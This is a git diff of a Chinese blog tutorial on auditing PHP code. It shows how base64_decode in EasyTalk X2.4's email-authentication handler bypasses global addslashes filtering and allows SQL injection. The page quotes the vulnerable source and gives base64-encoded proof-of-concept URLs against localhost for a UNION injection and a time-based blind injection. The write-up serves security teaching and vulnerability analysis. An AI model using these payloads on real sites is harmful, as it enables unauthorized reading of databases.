@@ -95,7 +95,7 @@
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_04.jpg">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_05.jpg">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql2_1.png">
-<meta property="og:updated_time" content="2016-05-03T01:13:39.547Z">
+<meta property="og:updated_time" content="2016-05-03T07:00:32.541Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【PHP代码审计】 那些年我们一起挖掘SQL注入 - 3.全局防护Bypass之Base64Decode">
 <meta name="twitter:description" content="0x01 背景现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。同上一篇，我们需要找一些编码解码的函数来绕过全局防护，本篇介绍base64decode()的情况。漏洞来源于乌云：http://www.wooyun.org/bugs/wooyun-2014-050338">
@@ -332,43 +332,9 @@
       
         <h2 id="0x01_背景">0x01 背景</h2><p>现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。同上一篇，我们需要找一些编码解码的函数来绕过全局防护，本篇介绍base64decode()的情况。<br><strong>漏洞来源于乌云：<a href="http://www.wooyun.org/bugs/wooyun-2014-050338" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-050338</a></strong><br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_05.jpg" alt=""><br><a id="more"></a></p>
 <h2 id="0x02_环境搭建">0x02 环境搭建</h2><p>看背景我们使用了低版本的easytalk程序，版本为X2.4<br>①源码我打包了一份：<a href="http://pan.baidu.com/s/1bopOFNL" title="easytalk.zip" target="_blank" rel="external">http://pan.baidu.com/s/1bopOFNL</a><br>②解压到www的easytalk目录下，按照提示一步步安装即可，遇到问题自行百度或谷歌，成功后访问如下图：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_2.png" alt=""></p>
-<h2 id="0x03_漏洞分析">0x03 漏洞分析</h2><p>首先看下源码结构，用的ThinkPHP框架，比较复杂：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_3.png" alt=""><br>有兴趣的可以去研究下再继续往下看，新手可以知道ThinkPHP对接收的参数是有过滤的，并且根据你服务器是否开启GPC会做相应的处理：<br>1./ThinkPHP/Extend/Library/ORG/Util/Input.class.php文件第266行:</p>
-<pre><code>/**
- +----------------------------------------------------------
- * 如果 magic_quotes_gpc 为关闭状态，这个函数可以转义字符串
- +----------------------------------------------------------
- * @access public
- +----------------------------------------------------------
- * @param string <span class="variable">$string</span> 要处理的字符串
- +----------------------------------------------------------
- * @<span class="keyword">return</span> string
- +----------------------------------------------------------
- */
-static public <span class="keyword">function</span> addSlashes(<span class="variable">$string</span>) {
-    if (!get_magic_quotes_gpc()) {
-        <span class="variable">$string</span> = addslashes(<span class="variable">$string</span>);
-    }
-    return <span class="variable">$string</span>;
-}    
-</code></pre><p>2.使用Seay代码审计系统的全局搜索功能，搜索包含关键字为”base64_decode”的文件，发现SettingAction.class.php包含一个对接收的参数auth进行base64_decode的地方：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_04.jpg" alt=""><br>3.我们跟进这个php文件，发现虽然使用daddslashes函数进行了注入过滤，但是使用了base64_decode函数对参数auth进行了转码从而可以绕过过滤造成注入：</p>
-<pre><code>//认证电子邮件
-public <span class="keyword">function</span> doauth() {
-    $_authmsg=daddslashes($_GET[<span class="string">'auth'</span>]);//再次判断GPC是否开启并进行注入过滤
-    <span class="variable">$authmsg</span>=base64_decode($_authmsg);//base64_decode函数对参数进行转码处理
-    <span class="variable">$tem</span>=explode(<span class="string">":"</span>,<span class="variable">$authmsg</span>);//对解码后的参数authmsg按照“：”进行分割存入数组tem中
-    <span class="variable">$send</span>_id=<span class="variable">$tem</span>[<span class="number">0</span>];
-    <span class="variable">$user</span>=M(<span class="string">'Users'</span>);
-
-    <span class="variable">$row</span> = <span class="variable">$user-</span>&gt;field(<span class="string">'mailadres,auth_email'</span>)-&gt;where(<span class="string">"user_id='$send_id'"</span>)-&gt;find();//带入查询，在where子句里，造成注入
-    if ($_authmsg==<span class="variable">$row</span>[<span class="string">'auth_email'</span>]) {
-        <span class="variable">$user-</span>&gt;where(<span class="string">"user_id='$send_id'"</span>)-&gt;setField(<span class="string">'auth_email'</span>,<span class="number">1</span>);
-        setcookie(<span class="string">'setok'</span>, json_encode(array(<span class="string">'lang'</span>=&gt;L(<span class="string">'mail6'</span>),<span class="string">'ico'</span>=&gt;<span class="number">1</span>)),<span class="number">0</span>,<span class="string">'/'</span>);
-    } else {
-        setcookie(<span class="string">'setok'</span>, json_encode(array(<span class="string">'lang'</span>=&gt;L(<span class="string">'mail7'</span>),<span class="string">'ico'</span>=&gt;<span class="number">2</span>)),<span class="number">0</span>,<span class="string">'/'</span>);
-    }
-    header(<span class="string">'location:'</span>.SITE_URL.<span class="string">'/?m=setting&amp;a=mailauth'</span>);
-}
-</code></pre><h2 id="0x04_漏洞证明">0x04 漏洞证明</h2><p>构造获取数据库相关信息的POC：</p>
+<h2 id="0x03_漏洞分析">0x03 漏洞分析</h2><p>首先看下源码结构，用的ThinkPHP框架，比较复杂：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_3.png" alt=""><br>有兴趣的可以去研究下再继续往下看，新手可以知道ThinkPHP对接收的参数是有过滤的，并且根据你服务器是否开启GPC会做相应的处理：<br>1./ThinkPHP/Extend/Library/ORG/Util/Input.class.php文件第266行:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span><br><span class="line">+----------------------------------------------------------</span><br><span class="line"> * 如果 magic_quotes_gpc 为关闭状态，这个函数可以转义字符串</span><br><span class="line">+----------------------------------------------------------</span><br><span class="line"> * <span class="doctag">@access</span> public</span><br><span class="line">+----------------------------------------------------------</span><br><span class="line"> * <span class="doctag">@param</span> string $string 要处理的字符串</span><br><span class="line">+----------------------------------------------------------</span><br><span class="line"> * <span class="doctag">@return</span> string</span><br><span class="line">+----------------------------------------------------------</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addSlashes</span><span class="params">(<span class="variable">$string</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!get_magic_quotes_gpc()) &#123;</span><br><span class="line">        <span class="variable">$string</span> = addslashes(<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>2.使用Seay代码审计系统的全局搜索功能，搜索包含关键字为”base64_decode”的文件，发现SettingAction.class.php包含一个对接收的参数auth进行base64_decode的地方：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_04.jpg" alt=""><br>3.我们跟进这个php文件，发现虽然使用daddslashes函数进行了注入过滤，但是使用了base64_decode函数对参数auth进行了转码从而可以绕过过滤造成注入：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//认证电子邮件</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doauth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="variable">$_authmsg</span>=daddslashes(<span class="variable">$_GET</span>[<span class="string">'auth'</span>]);<span class="comment">//再次判断GPC是否开启并进行注入过滤</span></span><br><span class="line">    <span class="variable">$authmsg</span>=base64_decode(<span class="variable">$_authmsg</span>);<span class="comment">//base64_decode函数对参数进行转码处理</span></span><br><span class="line">    <span class="variable">$tem</span>=explode(<span class="string">":"</span>,<span class="variable">$authmsg</span>);<span class="comment">//对解码后的参数authmsg按照“：”进行分割存入数组tem中</span></span><br><span class="line">    <span class="variable">$send_id</span>=<span class="variable">$tem</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$user</span>=M(<span class="string">'Users'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$user</span>-&gt;field(<span class="string">'mailadres,auth_email'</span>)-&gt;where(<span class="string">"user_id='$send_id'"</span>)-&gt;find();<span class="comment">//带入查询，在where子句里，造成注入</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_authmsg</span>==<span class="variable">$row</span>[<span class="string">'auth_email'</span>]) &#123;</span><br><span class="line">        <span class="variable">$user</span>-&gt;where(<span class="string">"user_id='$send_id'"</span>)-&gt;setField(<span class="string">'auth_email'</span>,<span class="number">1</span>);</span><br><span class="line">        setcookie(<span class="string">'setok'</span>, json_encode(<span class="keyword">array</span>(<span class="string">'lang'</span>=&gt;L(<span class="string">'mail6'</span>),<span class="string">'ico'</span>=&gt;<span class="number">1</span>)),<span class="number">0</span>,<span class="string">'/'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        setcookie(<span class="string">'setok'</span>, json_encode(<span class="keyword">array</span>(<span class="string">'lang'</span>=&gt;L(<span class="string">'mail7'</span>),<span class="string">'ico'</span>=&gt;<span class="number">2</span>)),<span class="number">0</span>,<span class="string">'/'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">'location:'</span>.SITE_URL.<span class="string">'/?m=setting&amp;a=mailauth'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x04_漏洞证明">0x04 漏洞证明</h2><p>构造获取数据库相关信息的POC：</p>
 <pre><code><span class="string">http:</span><span class="comment">//localhost/eazytalk/?m=setting&amp;a=doauth&amp;auth=aGFja2luZycgdW5pb24gc2VsZWN0IHVzZXIoKSwyIw==</span>
 </code></pre><p>查看sql语句发现成功执行：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_05.jpg" alt=""><br>发现这里是一个盲注，并没有输出，所以我们使用sql盲注的语句。获取当前数据库用户名的第一个字符是不是‘r’（ascii值为114）的POC：</p>
 <pre><code><span class="string">http:</span><span class="comment">//localhost/eazytalk/?m=index&amp;a=mailactivity&amp;auth=MicgYW5kIChzZWxlY3QgaWYoKGFzY2lpKHN1YnN0cmluZygoc2VsZWN0IHVzZXIoKSksMSwxKSkgPSAxMTQpLHNsZWVwKDUpLDApKSM=</span>
